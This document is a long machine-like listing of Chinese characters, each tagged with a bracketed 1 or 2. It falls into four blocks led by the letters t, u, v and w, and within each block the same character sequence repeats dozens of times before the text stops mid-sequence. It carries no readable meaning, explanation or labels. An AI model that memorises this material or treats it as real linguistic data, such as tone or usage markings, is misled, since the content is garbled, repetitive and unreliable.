拿[1]介[2]担[1]蛋[2]秋[2]屋[2]苗[1]t下[2]之[2]事[2]看[2]立[2]程[2]手[2]压[2]例[2]拉[1]律[2]克[2]型[2]王[2]始[2]苏[1]英[1]独[1]测[2]友[2]洋[2]苦[1]若[1]括[1]拿[1]介[2]担[1]蛋[2]秋[2]屋[2]苗[1]t下[2]之[2]事[2]看[2]立[2]程[2]手[2]压[2]例[2]拉[1]律[2]克[2]型[2]王[2]始[2]苏[1]英[1]独[1]测[2]友[2]洋[2]苦[1]若[1]括[1]拿[1]介[2]担[1]蛋[2]秋[2]屋[2]苗[1]t下[2]之[2]事[2]看[2]立[2]程[2]手[2]压[2]例[2]拉[1]律[2]克[2]型[2]王[2]始[2]苏[1]英[1]独[1]测[2]友[2]洋[2]苦[1]若[1]括[1]拿[1]介[2]担[1]蛋[2]秋[2]屋[2]苗[1]t下[2]之[2]事[2]看[2]立[2]程[2]手[2]压[2]例[2]拉[1]律[2]克[2]型[2]王[2]始[2]苏[1]英[1]独[1]测[2]友[2]洋[2]苦[1]若[1]括[1]拿[1]介[2]担[1]蛋[2]秋[2]屋[2]苗[1]t下[2]之[2]事[2]看[2]立[2]程[2]手[2]压[2]例[2]拉[1]律[2]克[2]型[2]王[2]始[2]苏[1]英[1]独[1]测[2]友[2]洋[2]苦[1]若[1]括[1]拿[1]介[2]担[1]蛋[2]秋[2]屋[2]苗[1]t下[2]之[2]事[2]看[2]立[2]程[2]手[2]压[2]例[2]拉[1]律[2]克[2]型[2]王[2]始[2]苏[1]英[1]独[1]测[2]友[2]洋[2]苦[1]若[1]括[1]拿[1]介[2]担[1]蛋[2]秋[2]屋[2]苗[1]t下[2]之[2]事[2]看[2]立[2]程[2]手[2]压[2]例[2]拉[1]律[2]克[2]型[2]王[2]始[2]苏[1]英[1]独[1]测[2]友[2]洋[2]苦[1]若[1]括[1]拿[1]介[2]担[1]蛋[2]秋[2]屋[2]苗[1]t下[2]之[2]事[2]看[2]立[2]程[2]手[2]压[2]例[2]拉[1]律[2]克[2]型[2]王[2]始[2]苏[1]英[1]独[1]测[2]友[2]洋[2]苦[1]若[1]括[1]拿[1]介[2]担[1]蛋[2]秋[2]屋[2]苗[1]t下[2]之[2]事[2]看[2]立[2]程[2]手[2]压[2]例[2]拉[1]律[2]克[2]型[2]王[2]始[2]苏[1]英[1]独[1]测[2]友[2]洋[2]苦[1]若[1]括[1]拿[1]介[2]担[1]蛋[2]秋[2]屋[2]苗[1]t下[2]之[2]事[2]看[2]立[2]程[2]手[2]压[2]例[2]拉[1]律[2]克[2]型[2]王[2]始[2]苏[1]英[1]独[1]测[2]友[2]洋[2]苦[1]若[1]括[1]拿[1]介[2]担[1]蛋[2]秋[2]屋[2]苗[1]t下[2]之[2]事[2]看[2]立[2]程[2]手[2]压[2]例[2]拉[1]律[2]克[2]型[2]王[2]始[2]苏[1]英[1]独[1]测[2]友[2]洋[2]苦[1]若[1]括[1]拿[1]介[2]担[1]蛋[2]秋[2]屋[2]苗[1]t下[2]之[2]事[2]看[2]立[2]程[2]手[2]压[2]例[2]拉[1]律[2]克[2]型[2]王[2]始[2]苏[1]英[1]独[1]测[2]友[2]洋[2]苦[1]若[1]括[1]拿[1]介[2]担[1]蛋[2]秋[2]屋[2]苗[1]t下[2]之[2]事[2]看[2]立[2]程[2]手[2]压[2]例[2]拉[1]律[2]克[2]型[2]王[2]始[2]苏[1]英[1]独[1]测[2]友[2]洋[2]苦[1]若[1]括[1]拿[1]介[2]担[1]蛋[2]秋[2]屋[2]苗[1]t下[2]之[2]事[2]看[2]立[2]程[2]手[2]压[2]例[2]拉[1]律[2]克[2]型[2]王[2]始[2]苏[1]英[1]独[1]测[2]友[2]洋[2]苦[1]若[1]括[1]拿[1]介[2]担[1]蛋[2]秋[2]屋[2]苗[1]t下[2]之[2]事[2]看[2]立[2]程[2]手[2]压[2]例[2]拉[1]律[2]克[2]型[2]王[2]始[2]苏[1]英[1]独[1]测[2]友[2]洋[2]苦[1]若[1]括[1]拿[1]介[2]担[1]蛋[2]秋[2]屋[2]苗[1]t下[2]之[2]事[2]看[2]立[2]程[2]手[2]压[2]例[2]拉[1]律[2]克[2]型[2]王[2]始[2]苏[1]英[1]独[1]测[2]友[2]洋[2]苦[1]若[1]括[1]拿[1]介[2]担[1]蛋[2]秋[2]屋[2]苗[1] u上[2]动[1]力[1]加[1]把[1]把[2]及[2]花[1]务[1]报[1]节[1]今[2]越[2]技[1]半[2]办[1]劳[1]状[1]势[1]告[2]护[1]犯[1]功[1]助[1]抗[1]投[1]益[2]啊[2]抓[1]u上[2]动[1]力[1]加[1]把[1]把[2]及[2]花[1]务[1]报[1]节[1]今[2]越[2]技[1]半[2]办[1]劳[1]状[1]势[1]告[2]护[1]犯[1]功[1]助[1]抗[1]投[1]益[2]啊[2]抓[1]u上[2]动[1]力[1]加[1]把[1]把[2]及[2]花[1]务[1]报[1]节[1]今[2]越[2]技[1]半[2]办[1]劳[1]状[1]势[1]告[2]护[1]犯[1]功[1]助[1]抗[1]投[1]益[2]啊[2]抓[1]u上[2]动[1]力[1]加[1]把[1]把[2]及[2]花[1]务[1]报[1]节[1]今[2]越[2]技[1]半[2]办[1]劳[1]状[1]势[1]告[2]护[1]犯[1]功[1]助[1]抗[1]投[1]益[2]啊[2]抓[1]u上[2]动[1]力[1]加[1]把[1]把[2]及[2]花[1]务[1]报[1]节[1]今[2]越[2]技[1]半[2]办[1]劳[1]状[1]势[1]告[2]护[1]犯[1]功[1]助[1]抗[1]投[1]益[2]啊[2]抓[1]u上[2]动[1]力[1]加[1]把[1]把[2]及[2]花[1]务[1]报[1]节[1]今[2]越[2]技[1]半[2]办[1]劳[1]状[1]势[1]告[2]护[1]犯[1]功[1]助[1]抗[1]投[1]益[2]啊[2]抓[1]u上[2]动[1]力[1]加[1]把[1]把[2]及[2]花[1]务[1]报[1]节[1]今[2]越[2]技[1]半[2]办[1]劳[1]状[1]势[1]告[2]护[1]犯[1]功[1]助[1]抗[1]投[1]益[2]啊[2]抓[1]u上[2]动[1]力[1]加[1]把[1]把[2]及[2]花[1]务[1]报[1]节[1]今[2]越[2]技[1]半[2]办[1]劳[1]状[1]势[1]告[2]护[1]犯[1]功[1]助[1]抗[1]投[1]益[2]啊[2]抓[1]u上[2]动[1]力[1]加[1]把[1]把[2]及[2]花[1]务[1]报[1]节[1]今[2]越[2]技[1]半[2]办[1]劳[1]状[1]势[1]告[2]护[1]犯[1]功[1]助[1]抗[1]投[1]益[2]啊[2]抓[1]u上[2]动[1]力[1]加[1]把[1]把[2]及[2]花[1]务[1]报[1]节[1]今[2]越[2]技[1]半[2]办[1]劳[1]状[1]势[1]告[2]护[1]犯[1]功[1]助[1]抗[1]投[1]益[2]啊[2]抓[1]u上[2]动[1]力[1]加[1]把[1]把[2]及[2]花[1]务[1]报[1]节[1]今[2]越[2]技[1]半[2]办[1]劳[1]状[1]势[1]告[2]护[1]犯[1]功[1]助[1]抗[1]投[1]益[2]啊[2]抓[1]u上[2]动[1]力[1]加[1]把[1]把[2]及[2]花[1]务[1]报[1]节[1]今[2]越[2]技[1]半[2]办[1]劳[1]状[1]势[1]告[2]护[1]犯[1]功[1]助[1]抗[1]投[1]益[2]啊[2]抓[1]u上[2]动[1]力[1]加[1]把[1]把[2]及[2]花[1]务[1]报[1]节[1]今[2]越[2]技[1]半[2]办[1]劳[1]状[1]势[1]告[2]护[1]犯[1]功[1]助[1]抗[1]投[1]益[2]啊[2]抓[1]u上[2]动[1]力[1]加[1]把[1]把[2]及[2]花[1]务[1]报[1]节[1]今[2]越[2]技[1]半[2]办[1]劳[1]状[1]势[1]告[2]护[1]犯[1]功[1]助[1]抗[1]投[1]益[2]啊[2]抓[1]u上[2]动[1]力[1]加[1]把[1]把[2]及[2]花[1]务[1]报[1]节[1]今[2]越[2]技[1]半[2]办[1]劳[1]状[1]势[1]告[2]护[1]犯[1]功[1]助[1]抗[1]投[1]益[2]啊[2]抓[1]u上[2]动[1]力[1]加[1]把[1]把[2]及[2]花[1]务[1]报[1]节[1]今[2]越[2]技[1]半[2]办[1]劳[1]状[1]势[1]告[2]护[1]犯[1]功[1]助[1]抗[1]投[1]益[2]啊[2]抓[1]u上[2]动[1]力[1]加[1]把[1]把[2]及[2]花[1]务[1]报[1]节[1]今[2]越[2]技[1]半[2]办[1]劳[1]状[1]势[1]告[2]护[1]犯[1]功[1]助[1]抗[1]投[1]益[2]啊[2]抓[1]u上[2]动[1]力[1]加[1]把[1]把[2]及[2]花[1]务[1]报[1]节[1]今[2]越[2]技[1]半[2]办[1]劳[1]状[1]势[1]告[2]护[1]犯[1]功[1]助[1]抗[1]投[1]益[2]啊[2]抓[1]u上[2]动[1]力[1]加[1]把[1]把[2]及[2]花[1]务[1]报[1]节[1]今[2]越[2]技[1]半[2]办[1]劳[1]状[1]势[1]告[2]护[1]犯[1]功[1]助[1]抗[1]投[1]益[2]啊[2]抓[1]u上[2]动[1]力[1]加[1]把[1]把[2]及[2]花[1]务[1]报[1]节[1]今[2]越[2]技[1]半[2]办[1]劳[1]状[1]势[1]告[2]护[1]犯[1]功[1]助[1]抗[1]投[1]益[2]啊[2]抓[1]u上[2]动[1]力[1]加[1]把[1]把[2]及[2]花[1]务[1]报[1]节[1]今[2]越[2]技[1]半[2]办[1]劳[1]状[1]势[1]告[2]护[1]犯[1]功[1]助[1]抗[1]投[1]益[2]啊[2]抓[1]u上[2]动[1]力[1]加[1]把[1]把[2]及[2]花[1]务[1]报[1]节[1]今[2]越[2]技[1]半[2]办[1]劳[1]状[1]势[1]告[2]护[1]犯[1]功[1]助[1]抗[1]投[1]益[2]啊[2]抓[1]u上[2]动[1]力[1]加[1]把[1]把[2]及[2]花[1]务[1]报[1]节[1]今[2]越[2]技[1]半[2]办[1]劳[1]状[1]势[1]告[2]护[1]犯[1]功[1]助[1]抗[1]投[1]益[2]啊[2]抓[1]u上[2]动[1]力[1]加[1]把[1]把[2]及[2]花[1]务[1]报[1]节[1]今[2]越[2]技[1]半[2]办[1]劳[1]状[1]势[1]告[2]护[1]犯[1]功[1]助[1]抗[1]投[1]益[2]啊[2]抓[1]u上[2]动[1]力[1]加[1]把[1]把[2]及[2]花[1]务[1]报[1]节[1]今[2]越[2]技[1]半[2]办[1]劳[1]状[1]势[1]告[2]护[1]犯[1]功[1]助[1]抗[1]投[1]益[2]啊[2]抓[1]u上[2]动[1]力[1]加[1]把[1]把[2]及[2]花[1]务[1]报[1]节[1]今[2]越[2]技[1]半[2]办[1]劳[1]状[1]势[1]告[2]护[1]犯[1]功[1]助[1]抗[1]投[1]益[2]啊[2]抓[1]u上[2]动[1]力[1]加[1]把[1]把[2]及[2]花[1]务[1]报[1]节[1]今[2]越[2]技[1]半[2]办[1]劳[1]状[1]势[1]告[2]护[1]犯[1]功[1]助[1]抗[1]投[1]益[2]啊[2]抓[1]u上[2]动[1]力[1]加[1]把[1]把[2]及[2]花[1]务[1]报[1]节[1]今[2]越[2]技[1]半[2]办[1]劳[1]状[1]势[1]告[2]护[1]犯[1]功[1]助[1]抗[1]投[1]益[2]啊[2]抓[1]u上[2]动[1]力[1]加[1]把[1]把[2]及[2]花[1]务[1]报[1]节[1]今[2]越[2]技[1]半[2]办[1]劳[1]状[1]势[1]告[2]护[1]犯[1]功[1]助[1]抗[1]投[1]益[2]啊[2]抓[1]u上[2]动[1]力[1]加[1]把[1]把[2]及[2]花[1]务[1]报[1]节[1]今[2]越[2]技[1]半[2]办[1]劳[1]状[1]势[1]告[2]护[1]犯[1]功[1]助[1]抗[1]投[1]益[2]啊[2]抓[1] v有[2]所[1]三[2]等[2]物[1]前[1]义[2]特[1]手[1]色[1]光[2]争[2]打[1]安[2]才[1]拉[2]选[2]按[2]片[1]艺[1]批[1]觉[2]汉[2]副[1]草[2]承[1]良[1]找[1]粉[2]剂[1]诉[2]扩[1]沉[2]执[1]肉[2]扬[1]棉[2]牛[1]掉[2]剧[1]玉[2]v有[2]所[1]三[2]等[2]物[1]前[1]义[2]特[1]手[1]色[1]光[2]争[2]打[1]安[2]才[1]拉[2]选[2]按[2]片[1]艺[1]批[1]觉[2]汉[2]副[1]草[2]承[1]良[1]找[1]粉[2]剂[1]诉[2]扩[1]沉[2]执[1]肉[2]扬[1]棉[2]牛[1]掉[2]剧[1]玉[2]v有[2]所[1]三[2]等[2]物[1]前[1]义[2]特[1]手[1]色[1]光[2]争[2]打[1]安[2]才[1]拉[2]选[2]按[2]片[1]艺[1]批[1]觉[2]汉[2]副[1]草[2]承[1]良[1]找[1]粉[2]剂[1]诉[2]扩[1]沉[2]执[1]肉[2]扬[1]棉[2]牛[1]掉[2]剧[1]玉[2]v有[2]所[1]三[2]等[2]物[1]前[1]义[2]特[1]手[1]色[1]光[2]争[2]打[1]安[2]才[1]拉[2]选[2]按[2]片[1]艺[1]批[1]觉[2]汉[2]副[1]草[2]承[1]良[1]找[1]粉[2]剂[1]诉[2]扩[1]沉[2]执[1]肉[2]扬[1]棉[2]牛[1]掉[2]剧[1]玉[2]v有[2]所[1]三[2]等[2]物[1]前[1]义[2]特[1]手[1]色[1]光[2]争[2]打[1]安[2]才[1]拉[2]选[2]按[2]片[1]艺[1]批[1]觉[2]汉[2]副[1]草[2]承[1]良[1]找[1]粉[2]剂[1]诉[2]扩[1]沉[2]执[1]肉[2]扬[1]棉[2]牛[1]掉[2]剧[1]玉[2]v有[2]所[1]三[2]等[2]物[1]前[1]义[2]特[1]手[1]色[1]光[2]争[2]打[1]安[2]才[1]拉[2]选[2]按[2]片[1]艺[1]批[1]觉[2]汉[2]副[1]草[2]承[1]良[1]找[1]粉[2]剂[1]诉[2]扩[1]沉[2]执[1]肉[2]扬[1]棉[2]牛[1]掉[2]剧[1]玉[2]v有[2]所[1]三[2]等[2]物[1]前[1]义[2]特[1]手[1]色[1]光[2]争[2]打[1]安[2]才[1]拉[2]选[2]按[2]片[1]艺[1]批[1]觉[2]汉[2]副[1]草[2]承[1]良[1]找[1]粉[2]剂[1]诉[2]扩[1]沉[2]执[1]肉[2]扬[1]棉[2]牛[1]掉[2]剧[1]玉[2]v有[2]所[1]三[2]等[2]物[1]前[1]义[2]特[1]手[1]色[1]光[2]争[2]打[1]安[2]才[1]拉[2]选[2]按[2]片[1]艺[1]批[1]觉[2]汉[2]副[1]草[2]承[1]良[1]找[1]粉[2]剂[1]诉[2]扩[1]沉[2]执[1]肉[2]扬[1]棉[2]牛[1]掉[2]剧[1]玉[2]v有[2]所[1]三[2]等[2]物[1]前[1]义[2]特[1]手[1]色[1]光[2]争[2]打[1]安[2]才[1]拉[2]选[2]按[2]片[1]艺[1]批[1]觉[2]汉[2]副[1]草[2]承[1]良[1]找[1]粉[2]剂[1]诉[2]扩[1]沉[2]执[1]肉[2]扬[1]棉[2]牛[1]掉[2]剧[1]玉[2]v有[2]所[1]三[2]等[2]物[1]前[1]义[2]特[1]手[1]色[1]光[2]争[2]打[1]安[2]才[1]拉[2]选[2]按[2]片[1]艺[1]批[1]觉[2]汉[2]副[1]草[2]承[1]良[1]找[1]粉[2]剂[1]诉[2]扩[1]沉[2]执[1]肉[2]扬[1]棉[2]牛[1]掉[2]剧[1]玉[2]v有[2]所[1]三[2]等[2]物[1]前[1]义[2]特[1]手[1]色[1]光[2]争[2]打[1]安[2]才[1]拉[2]选[2]按[2]片[1]艺[1]批[1]觉[2]汉[2]副[1]草[2]承[1]良[1]找[1]粉[2]剂[1]诉[2]扩[1]沉[2]执[1]肉[2]扬[1]棉[2]牛[1]掉[2]剧[1]玉[2]v有[2]所[1]三[2]等[2]物[1]前[1]义[2]特[1]手[1]色[1]光[2]争[2]打[1]安[2]才[1]拉[2]选[2]按[2]片[1]艺[1]批[1]觉[2]汉[2]副[1]草[2]承[1]良[1]找[1]粉[2]剂[1]诉[2]扩[1]沉[2]执[1]肉[2]扬[1]棉[2]牛[1]掉[2]剧[1]玉[2]v有[2]所[1]三[2]等[2]物[1]前[1]义[2]特[1]手[1]色[1]光[2]争[2]打[1]安[2]才[1]拉[2]选[2]按[2]片[1]艺[1]批[1]觉[2]汉[2]副[1]草[2]承[1]良[1]找[1]粉[2]剂[1]诉[2]扩[1]沉[2]执[1]肉[2]扬[1]棉[2]牛[1]掉[2]剧[1]玉[2]v有[2]所[1]三[2]等[2]物[1]前[1]义[2]特[1]手[1]色[1]光[2]争[2]打[1]安[2]才[1]拉[2]选[2]按[2]片[1]艺[1]批[1]觉[2]汉[2]副[1]草[2]承[1]良[1]找[1]粉[2]剂[1]诉[2]扩[1]沉[2]执[1]肉[2]扬[1]棉[2]牛[1]掉[2]剧[1]玉[2]v有[2]所[1]三[2]等[2]物[1]前[1]义[2]特[1]手[1]色[1]光[2]争[2]打[1]安[2]才[1]拉[2]选[2]按[2]片[1]艺[1]批[1]觉[2]汉[2]副[1]草[2]承[1]良[1]找[1]粉[2]剂[1]诉[2]扩[1]沉[2]执[1]肉[2]扬[1]棉[2]牛[1]掉[2]剧[1]玉[2]v有[2]所[1]三[2]等[2]物[1]前[1]义[2]特[1]手[1]色[1]光[2]争[2]打[1]安[2]才[1]拉[2]选[2]按[2]片[1]艺[1]批[1]觉[2]汉[2]副[1]草[2]承[1]良[1]找[1]粉[2]剂[1]诉[2]扩[1]沉[2]执[1]肉[2]扬[1]棉[2]牛[1]掉[2]剧[1]玉[2]v有[2]所[1]三[2]等[2]物[1]前[1]义[2]特[1]手[1]色[1]光[2]争[2]打[1]安[2]才[1]拉[2]选[2]按[2]片[1]艺[1]批[1]觉[2]汉[2]副[1]草[2]承[1]良[1]找[1]粉[2]剂[1]诉[2]扩[1]沉[2]执[1]肉[2]扬[1]棉[2]牛[1]掉[2]剧[1]玉[2]v有[2]所[1]三[2]等[2]物[1]前[1]义[2]特[1]手[1]色[1]光[2]争[2]打[1]安[2]才[1]拉[2]选[2]按[2]片[1]艺[1]批[1]觉[2]汉[2]副[1]草[2]承[1]良[1]找[1]粉[2]剂[1]诉[2]扩[1]沉[2]执[1]肉[2]扬[1]棉[2]牛[1]掉[2]剧[1]玉[2]v有[2]所[1]三[2]等[2]物[1]前[1]义[2]特[1]手[1]色[1]光[2]争[2]打[1]安[2]才[1]拉[2]选[2]按[2]片[1]艺[1]批[1]觉[2]汉[2]副[1]草[2]承[1]良[1]找[1]粉[2]剂[1]诉[2]扩[1]沉[2]执[1]肉[2]扬[1]棉[2]牛[1]掉[2]剧[1]玉[2]v有[2]所[1]三[2]等[2]物[1]前[1]义[2]特[1]手[1]色[1]光[2]争[2]打[1]安[2]才[1]拉[2]选[2]按[2]片[1]艺[1]批[1]觉[2]汉[2]副[1]草[2]承[1]良[1]找[1]粉[2]剂[1]诉[2]扩[1]沉[2]执[1]肉[2]扬[1]棉[2]牛[1]掉[2]剧[1]玉[2]v有[2]所[1]三[2]等[2]物[1]前[1]义[2]特[1]手[1]色[1]光[2]争[2]打[1]安[2]才[1]拉[2]选[2]按[2]片[1]艺[1]批[1]觉[2]汉[2]副[1]草[2]承[1]良[1]找[1]粉[2]剂[1]诉[2]扩[1]沉[2]执[1]肉[2]扬[1]棉[2]牛[1]掉[2]剧[1]玉[2]v有[2]所[1]三[2]等[2]物[1]前[1]义[2]特[1]手[1]色[1]光[2]争[2]打[1]安[2]才[1]拉[2]选[2]按[2]片[1]艺[1]批[1]觉[2]汉[2]副[1]草[2]承[1]良[1]找[1]粉[2]剂[1]诉[2]扩[1]沉[2]执[1]肉[2]扬[1]棉[2]牛[1]掉[2]剧[1]玉[2]v有[2]所[1]三[2]等[2]物[1]前[1]义[2]特[1]手[1]色[1]光[2]争[2]打[1]安[2]才[1]拉[2]选[2]按[2]片[1]艺[1]批[1]觉[2]汉[2]副[1]草[2]承[1]良[1]找[1]粉[2]剂[1]诉[2]扩[1]沉[2]执[1]肉[2]扬[1]棉[2]牛[1]掉[2]剧[1]玉[2]v有[2]所[1]三[2]等[2]物[1]前[1]义[2]特[1]手[1]色[1]光[2]争[2]打[1]安[2]才[1]拉[2]选[2]按[2]片[1]艺[1]批[1]觉[2]汉[2]副[1]草[2]承[1]良[1]找[1]粉[2]剂[1]诉[2]扩[1]沉[2]执[1]肉[2]扬[1]棉[2]牛[1]掉[2]剧[1]玉[2]v有[2]所[1]三[2]等[2]物[1]前[1]义[2]特[1]手[1]色[1]光[2]争[2]打[1]安[2]才[1]拉[2]选[2]按[2]片[1]艺[1]批[1]觉[2]汉[2]副[1]草[2]承[1]良[1]找[1]粉[2]剂[1]诉[2]扩[1]沉[2]执[1]肉[2]扬[1]棉[2]牛[1]掉[2]剧[1]玉[2]v有[2]所[1]三[2]等[2]物[1]前[1]义[2]特[1]手[1]色[1]光[2]争[2]打[1]安[2]才[1]拉[2]选[2]按[2]片[1]艺[1]批[1]觉[2]汉[2]副[1]草[2]承[1]良[1]找[1]粉[2]剂[1]诉[2]扩[1]沉[2]执[1]肉[2]扬[1]棉[2]牛[1]掉[2]剧[1]玉[2]v有[2]所[1]三[2]等[2]物[1]前[1]义[2]特[1]手[1]色[1]光[2]争[2]打[1]安[2]才[1]拉[2]选[2]按[2]片[1]艺[1]批[1]觉[2]汉[2]副[1]草[2]承[1]良[1]找[1]粉[2]剂[1]诉[2]扩[1]沉[2]执[1]肉[2]扬[1]棉[2]牛[1]掉[2]剧[1]玉[2]v有[2]所[1]三[2]等[2]物[1]前[1]义[2]特[1]手[1]色[1]光[2]争[2]打[1]安[2]才[1]拉[2]选[2]按[2]片[1]艺[1]批[1]觉[2]汉[2]副[1]草[2]承[1]良[1]找[1]粉[2]剂[1]诉[2]扩[1]沉[2]执[1]肉[2]扬[1]棉[2]牛[1]掉[2]剧[1]玉[2]v有[2]所[1]三[2]等[2]物[1]前[1]义[2]特[1]手[1]色[1]光[2]争[2]打[1]安[2]才[1]拉[2]选[2]按[2]片[1]艺[1]批[1]觉[2]汉[2]副[1]草[2]承[1]良[1]找[1]粉[2]剂[1]诉[2]扩[1]沉[2]执[1]肉[2]扬[1]棉[2]牛[1]掉[2]剧[1]玉[2]v有[2]所[1]三[2]等[2]物[1]前[1]义[2]特[1]手[1]色[1]光[2]争[2]打[1]安[2]才[1]拉[2]选[2]按[2]片[1]艺[1]批[1]觉[2]汉[2]副[1]草[2]承[1]良[1]找[1]粉[2]剂[1]诉[2]扩[1]沉[2]执[1]肉[2]扬[1]棉[2]牛[1]掉[2]剧[1]玉[2]v有[2]所[1]三[2]等[2]物[1]前[1]义[2]特[1]手[1]色[1]光[2]争[2]打[1]安[2]才[1]拉[2]选[2]按[2]片[1]艺[1]批[1]觉[2]汉[2]副[1]草[2]承[1]良[1]找[1]粉[2]剂[1]诉[2]扩[1]沉[2]执[1]肉[2]扬[1]棉[2]牛[1]掉[2]剧[1]玉[2]v有[2]所[1]三[2]等[2]物[1]前[1]义[2]特[1]手[1]色[1]光[2]争[2]打[1]安[2]才[1]拉[2]选[2]按[2]片[1]艺[1]批[1]觉[2]汉[2]副[1]草[2]承[1]良[1]找[1]粉[2]剂[1]诉[2]扩[1]沉[2]执[1]肉[2]扬[1]棉[2]牛[1]掉[2]剧[1]玉[2]v有[2]所[1]三[2]等[2]物[1]前[1]义[2]特[1]手[1]色[1]光[2]争[2]打[1]安[2]才[1]拉[2]选[2]按[2]片[1]艺[1]批[1]觉[2]汉[2]副[1]草[2]承[1]良[1]找[1]粉[2]剂[1]诉[2]扩[1]沉[2]执[1]肉[2]扬[1]棉[2]牛[1]掉[2]剧[1]玉[2]v有[2]所[1]三[2]等[2]物[1]前[1]义[2]特[1]手[1]色[1]光[2]争[2]打[1]安[2]才[1]拉[2]选[2]按[2]片[1]艺[1]批[1]觉[2]汉[2]副[1]草[2]承[1]良[1]找[1]粉[2]剂[1]诉[2]扩[1]沉[2]执[1]肉[2]扬[1]棉[2]牛[1]掉[2]剧[1]玉[2]v有[2]所[1]三[2]等[2]物[1]前[1]义[2]特[1]手[1]色[1]光[2]争[2]打[1]安[2]才[1]拉[2]选[2]按[2]片[1]艺[1]批[1]觉[2]汉[2]副[1]草[2]承[1]良[1]找[1]粉[2]剂[1]诉[2]扩[1]沉[2]执[1]肉[2]扬[1]棉[2]牛[1]掉[2]剧[1]玉[2]v有[2]所[1]三[2]等[2]物[1]前[1]义[2]特[1]手[1]色[1]光[2]争[2]打[1]安[2]才[1]拉[2]选[2]按[2]片[1]艺[1]批[1]觉[2]汉[2]副[1]草[2]承[1]良[1]找[1]粉[2]剂[1]诉[2]扩[1]沉[2]执[1]肉[2]扬[1]棉[2]牛[1]掉[2]剧[1]玉[2]v有[2]所[1]三[2]等[2]物[1]前[1]义[2]特[1]手[1]色[1]光[2]争[2]打[1]安[2]才[1]拉[2]选[2]按[2]片[1]艺[1]批[1]觉[2]汉[2]副[1]草[2]承[1]良[1]找[1]粉[2]剂[1]诉[2]扩[1]沉[2]执[1]肉[2]扬[1]棉[2]牛[1]掉[2]剧[1]玉[2]v有[2]所[1]三[2]等[2]物[1]前[1]义[2]特[1]手[1]色[1]光[2]争[2]打[1]安[2]才[1]拉[2]选[2]按[2]片[1]艺[1]批[1]觉[2]汉[2]副[1]草[2]承[1]良[1]找[1]粉[2]剂[1]诉[2]扩[1]沉[2]执[1]肉[2]扬[1]棉[2]牛[1]掉[2]剧[1]玉[2]v有[2]所[1]三[2]等[2]物[1]前[1]义[2]特[1]手[1]色[1]光[2]争[2]打[1]安[2]才[1]拉[2]选[2]按[2]片[1]艺[1]批[1]觉[2]汉[2]副[1]草[2]承[1]良[1]找[1]粉[2]剂[1]诉[2]扩[1]沉[2]执[1]肉[2]扬[1]棉[2]牛[1]掉[2]剧[1]玉[2]v有[2]所[1]三[2]等[2]物[1]前[1]义[2]特[1]手[1]色[1]光[2]争[2]打[1]安[2]才[1]拉[2]选[2]按[2]片[1]艺[1]批[1]觉[2]汉[2]副[1]草[2]承[1]良[1]找[1]粉[2]剂[1]诉[2]扩[1]沉[2]执[1]肉[2]扬[1]棉[2]牛[1]掉[2]剧[1]玉[2]v有[2]所[1]三[2]等[2]物[1]前[1]义[2]特[1]手[1]色[1]光[2]争[2]打[1]安[2]才[1]拉[2]选[2]按[2]片[1]艺[1]批[1]觉[2]汉[2]副[1]草[2]承[1]良[1]找[1]粉[2]剂[1]诉[2]扩[1]沉[2]执[1]肉[2]扬[1]棉[2]牛[1]掉[2]剧[1]玉[2]v有[2]所[1]三[2]等[2]物[1]前[1]义[2]特[1]手[1]色[1]光[2]争[2]打[1]安[2]才[1]拉[2]选[2]按[2]片[1]艺[1]批[1]觉[2]汉[2]副[1]草[2]承[1]良[1]找[1]粉[2]剂[1]诉[2]扩[1]沉[2]执[1]肉[2]扬[1]棉[2]牛[1]掉[2]剧[1]玉[2] w我[1]到[1]分[1]成[1]制[1]合[2]又[2]利[1]或[1]月[2]很[2]别[1]战[1]先[2]则[1]切[1]列[1]般[1]消[2]划[1]效[2]谈[2]师[2]案[2]爱[1]判[1]船[1]初[1]创[1]房[1]陈[2]刑[1]终[2]烈[2]刻[1]妈[2]守[2]针[2]刘[1]父[1]刚[1]航[1]w我[1]到[1]分[1]成[1]制[1]合[2]又[2]利[1]或[1]月[2]很[2]别[1]战[1]先[2]则[1]切[1]列[1]般[1]消[2]划[1]效[2]谈[2]师[2]案[2]爱[1]判[1]船[1]初[1]创[1]房[1]陈[2]刑[1]终[2]烈[2]刻[1]妈[2]守[2]针[2]刘[1]父[1]刚[1]航[1]w我[1]到[1]分[1]成[1]制[1]合[2]又[2]利[1]或[1]月[2]很[2]别[1]战[1]先[2]则[1]切[1]列[1]般[1]消[2]划[1]效[2]谈[2]师[2]案[2]爱[1]判[1]船[1]初[1]创[1]房[1]陈[2]刑[1]终[2]烈[2]刻[1]妈[2]守[2]针[2]刘[1]父[1]刚[1]航[1]w我[1]到[1]分[1]成[1]制[1]合[2]又[2]利[1]或[1]月[2]很[2]别[1]战[1]先[2]则[1]切[1]列[1]般[1]消[2]划[1]效[2]谈[2]师[2]案[2]爱[1]判[1]船[1]初[1]创[1]房[1]陈[2]刑[1]终[2]烈[2]刻[1]妈[2]守[2]针[2]刘[1]父[1]刚[1]航[1]w我[1]到[1]分[1]成[1]制[1]合[2]又[2]利[1]或[1]月[2]很[2]别[1]战[1]先[2]则[1]切[1]列[1]般[1]消[2]划[1]效[2]谈[2]师[2]案[2]爱[1]判[1]船[1]初[1]创[1]房[1]陈[2]刑[1]终[2]烈[2]刻[1]妈[2]守[2]针[2]刘[1]父[1]刚[1]航[1]w我[1]到[1]分[1]成[1]制[1]合[2]又[2]利[1]或[1]月[2]很[2]别[1]战[1]先[2]则[1]切[1]列[1]般[1]消[2]划[1]效[2]谈[2]师[2]案[2]爱[1]判[1]船[1]初[1]创[1]房[1]陈[2]刑[1]终[2]烈[2]刻[1]妈[2]守[2]针[2]刘[1]父[1]刚[1]航[1]w我[1]到[1]分[1]成[1]制[1]合[2]又[2]利[1]或[1]月[2]很[2]别[1]战[1]先[2]则[1]切[1]列[1]般[1]消[2]划[1]效[2]谈[2]师[2]案[2]爱[1]判[1]船[1]初[1]创[1]房[1]陈[2]刑[1]终[2]烈[2]刻[1]妈[2]守[2]针[2]刘[1]父[1]刚[1]航[1]w我[1]到[1]分[1]成[1]制[1]合[2]又[2]利[1]或[1]月[2]很[2]别[1]战[1]先[2]则[1]切[1]列[1]般[1]消[2]划[1]效[2]谈[2]师[2]案[2]爱[1]判[1]船[1]初[1]创[1]房[1]陈[2]刑[1]终[2]烈[2]刻[1]妈[2]守[2]针[2]刘[1]父[1]刚[1]航[1]w我[1]到[1]分[1]成[1]制[1]合[2]又[2]利[1]或[1]月[2]很[2]别[1]战[1]先[2]则[1]切[1]列[1]般[1]消[2]划[1]效[2]谈[2]师[2]案[2]爱[1]判[1]船[1]初[1]创[1]房